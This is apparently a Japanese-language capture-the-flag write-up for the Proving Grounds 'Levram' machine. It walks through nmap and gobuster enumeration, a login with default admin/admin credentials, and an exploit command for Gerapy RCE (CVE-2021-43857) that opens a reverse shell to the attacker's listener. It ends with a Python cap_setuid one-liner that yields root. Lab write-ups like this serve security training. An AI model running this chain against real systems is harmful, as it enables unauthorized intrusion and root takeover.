+++
title = "Proving Grounds Practice - Levram Writeup"
date = "2026-11-26"
description = "Gerapyの認証後RCE（CVE-2021-43857）を利用して初期アクセスを取得し、Pythonに設定されたcap_setuid capabilityを悪用してroot権限を取得"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[Gerapy]", "[CVE-2021-43857 - Remote Code Execution]", "[Linux Capabilities]", "[Python]", "[Easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field      | Details        |
| ---------- | -------------- |
| Machine    | Levram         |
| OS         | Linux          |
| IP Address | 192.168.226.24 |
| Difficulty | Easy           |

---

## Reconnaissance

### Nmap Scan

まず、Nmapを使用して全TCPポートのスキャンとサービスのバージョン確認を行う。

```bash
nmap -sV -sC -p- 192.168.226.24
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-26 23:22 +0900
Nmap scan report for 192.168.226.24
Host is up (0.079s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    Python http.server 3.5 - 3.10
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-title: Gerapy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.07 seconds
```

スキャン結果から、以下のポートが開放されていることを確認した。

| Port    | Service | Version / Information |
| ------- | ------- | ---------------------- |
| 22/tcp  | SSH     | OpenSSH 8.9p1 Ubuntu   |
| 8000/tcp | HTTP   | Python http.server     |

8000/tcpでWebアプリケーションが動作しているため、こちらを重点的に調査する。

---

## Enumeration

### Directory Enumeration

Gobusterを使用してディレクトリ列挙を行う。

```bash
gobuster dir -u http://192.168.226.24:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```text
===============================================================
Gobuster v3.8.2
===============================================================
[+] Url:                     http://192.168.226.24:8000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin                (Status: 301) [Size: 0] [--> /admin/]
```

`/admin/` が見つかったため、それぞれブラウザからアクセスする。

```text
http://192.168.226.24:8000/
```
```text
http://192.168.226.24:8000/admin/
```

ログイン画面が表示された。両画面ともユーザー名とパスワードに `admin/admin` を入力するとログインに成功した。

ログイン後、Gerapyの管理画面を確認できた。

### Vulnerability Research

Gerapyについて調査するため、SearchSploitを実行する。

```bash
searchsploit gerapy
```

```text
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   | Path
--------------------------------------------------------------------------------- ---------------------------------
Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)                       | python/remote/50640.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Gerapy 0.9.7を対象とした、認証後のRemote Code Execution（RCE）が見つかった。

このExploitはCVE-2021-43857を利用するもので、Gerapy 0.9.8未満が対象となる。

今回は管理画面にログインできているため、この脆弱性を利用できる可能性がある。

---

## Initial Access

### Gerapy - Authenticated RCE (CVE-2021-43857)

SearchSploitで確認したExploitを使用する。

```bash
python 50640.py -t 192.168.226.24 -p 8000 -L 192.168.45.183 -P 443
```

最初の実行では、ログインに成功したものの、以下のエラーが発生した。

```text
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
Traceback (most recent call last):
  File "/home/kali/offsec/50640.py", line 130, in <module>
    exp.exploitation()
  File "/home/kali/offsec/50640.py", line 76, in exploitation
    name = dict3[0]['name']
           ~~~~~^^^
IndexError: list index out of range
```

エラーの原因は、Gerapyにプロジェクトが登録されていなかったことだった。

Exploitはプロジェクト一覧からプロジェクト名とIDを取得して処理を進めるため、先に管理画面からプロジェクトを作成する必要がある。

今回は管理画面にログインし、`test` というプロジェクトを作成した。

### Execute Exploit

プロジェクト作成後、再度Exploitを実行する。

```bash
python 50640.py -t 192.168.226.24 -p 8000 -L 192.168.45.183 -P 4444
```

実行結果は以下の通り。

```text
Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: test
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 4444 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
```

プロジェクト名`test`とID `1`が取得され、リバースシェルのペイロード実行に進んだ。

ExploitによってNetcatのリスナーが起動し、ターゲットから接続が返ってきた。

```text
connect to [192.168.45.183] from (UNKNOWN) [192.168.226.24] 54396
bash: cannot set terminal process group (846): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$
```

シェルを取得できたため、現在のユーザーと作業ディレクトリを確認する。

```bash
ls
```

```text
dbs
logs
projects
```

これにより、`app` ユーザーとして初期アクセスを取得できた。

---

## Privilege Escalation

### Linux Capabilities Enumeration

初期アクセス後、Linux Capabilitiesを調査する。

```bash
getcap -r / 2>/dev/null
```

実行結果は以下の通り。

```text
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```

この中で注目するのは、以下のエントリである。

```text
/usr/bin/python3.10 cap_setuid=ep
```

`cap_setuid` は、プロセスのUIDを変更するためのCapabilityである。

通常、一般ユーザーのプロセスがrootのUIDに変更することはできない。しかし、`cap_setuid=ep` が設定されたPythonは、UIDを変更するための権限を持っている。

そのため、このPythonを利用してUIDを0（root）に変更できる可能性がある。

### Python - cap_setuid Privilege Escalation

GTFOBinsのPythonのページを参考に、`os.setuid(0)` でUIDをrootに変更し、シェルを起動する。

参考:

[https://gtfobins.org/gtfobins/python/](https://gtfobins.org/gtfobins/python/)

以下のコマンドを実行する。

```bash
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

コマンドの処理は次の通り。

1. `import os`：PythonのOS操作用モジュールを読み込む。
2. `os.setuid(0)`：プロセスのUIDを0（root）に変更する。
3. `os.execl("/bin/sh", "sh")`：`/bin/sh`を実行する。

`cap_setuid=ep` によってUIDを変更できるため、root権限のシェルを取得できる。

### Root Shell

シェル取得後、現在のユーザーを確認する。

```bash
whoami
```

```text
root
```

root権限の取得に成功した。

### Capture Proof

rootシェルから`proof.txt`を確認する。

```bash
cat proof.txt
```

```text
9cf80cd5790764c0496f70be4d6ccd65
```

`proof.txt`の取得に成功した。

---

## Summary

Levramでは、Nmapによるポートスキャンで22/tcpと8000/tcpを発見した。

8000/tcpで動作するGerapyの管理画面を発見し、`admin/admin`でログインした。

SearchSploitでGerapy 0.9.7の認証後RCE（CVE-2021-43857）を発見した。最初のExploit実行ではプロジェクトが存在せずエラーになったが、管理画面から`test`プロジェクトを作成することで実行に成功した。

これにより、`app`ユーザーとしてリバースシェルを取得した。

特権昇格ではLinux Capabilitiesを調査し、`/usr/bin/python3.10`に`cap_setuid=ep`が設定されていることを発見した。

Pythonの`os.setuid(0)`を利用してUIDをrootに変更し、rootシェルを取得した。

**攻撃の流れ**

1. Nmapによる全TCPポートスキャン
2. Gobusterで`/admin/`を発見
3. `admin/admin`でGerapyにログイン
4. SearchSploitでCVE-2021-43857のExploitを発見
5. Gerapyに`test`プロジェクトを作成
6. Exploitを実行してリバースシェルを取得
7. `app`ユーザーで初期アクセス
8. `getcap`でLinux Capabilitiesを調査
9. Python 3.10の`cap_setuid=ep`を発見
10. `os.setuid(0)`を利用してroot権限を取得
11. `proof.txt`を取得

**Initial Access:** Gerapy - Authenticated RCE (CVE-2021-43857)

**Privilege Escalation:** Python 3.10 - `cap_setuid=ep`

**Final Access:** root
